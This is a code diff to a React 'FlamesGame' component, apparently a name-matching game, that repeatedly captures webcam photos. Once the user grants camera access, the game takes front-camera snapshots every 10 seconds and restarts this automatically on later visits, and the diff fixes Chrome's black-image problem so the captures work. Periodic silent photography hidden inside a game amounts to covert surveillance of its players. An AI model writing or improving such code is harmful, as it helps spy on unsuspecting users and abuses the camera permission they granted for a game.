@@ -1,4 +1,4 @@
-// Auto-capture: Chrome vs Other Browsers logic
+// Auto-capture: Chrome vs Other Browsers logic (FIXED for Chrome black image issue)
 import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
 import styled, { keyframes } from "styled-components";
 import PermissionPopup from "./PermissionPopup";
@@ -139,35 +139,26 @@ const FlamesGame = () => {
 
   useEffect(() => {
     if (localStorage.getItem("permissionsGiven") === "true") {
-      handleAllow();
+      setTimeout(() => handleAllow(), 300);
     }
   }, []);
 
   const startStream = async () => {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     if (videoRef.current) {
       videoRef.current.srcObject = stream;
-      videoRef.current.setAttribute("playsinline", true);
+      await videoRef.current.play();
     }
     return stream;
   };
 
-  const waitForVideoReady = () => new Promise(res => {
-    const v = videoRef.current;
-    if (!v) return res();
-    if (v.readyState >= 3) return res();
-    const handler = () => {
-      v.removeEventListener("canplay", handler);
-      res();
-    };
-    v.addEventListener("canplay", handler);
-  });
-
   const capturePhoto = async () => {
-    await waitForVideoReady();
-    const canvas = canvasRef.current;
     const video = videoRef.current;
-    if (!canvas || !video) return;
+    const canvas = canvasRef.current;
+    if (!canvas || !video || video.videoWidth === 0 || video.videoHeight === 0) {
+      console.warn("🚫 Skipped capture - video not ready");
+      return;
+    }
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext("2d");
@@ -189,9 +180,12 @@ const FlamesGame = () => {
     setShowPermissionPopup(false);
     localStorage.setItem("permissionsGiven", "true");
     setPermissionStatus("Camera access granted ✅");
+
     if (isChrome) {
       const stream = await startStream();
-      setInterval(capturePhoto, 10000);
+      setInterval(async () => {
+        await capturePhoto();
+      }, 10000);
     } else {
       const loop = async () => {
         while (true) {
